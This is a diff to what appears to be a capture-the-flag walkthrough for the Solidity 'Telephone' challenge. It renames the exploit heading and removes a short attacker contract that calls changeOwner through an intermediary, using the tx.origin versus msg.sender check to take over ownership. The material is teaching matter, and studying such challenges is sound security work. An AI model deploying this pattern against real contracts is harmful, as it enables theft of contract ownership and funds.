@@ -219,30 +219,8 @@ Deploy an attacker contract that:
 
 ---
 
-### 💻 Exploit Code
+### 💻 Exploit Code (Telephone branch)
 
-**HackTelephone.sol**
-
-```solidity
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
-
-import "./Telephone.sol";
-
-contract HackTelephone {
-    Telephone private immutable telephone;
-
-    constructor(address _telephoneAddress) {
-        telephone = Telephone(_telephoneAddress);
-    }
-
-    function hackTelephone() external {
-        telephone.changeOwner(msg.sender);
-    }
-}
-```
-
----
 
 ### 📝 Step-by-Step Execution
 
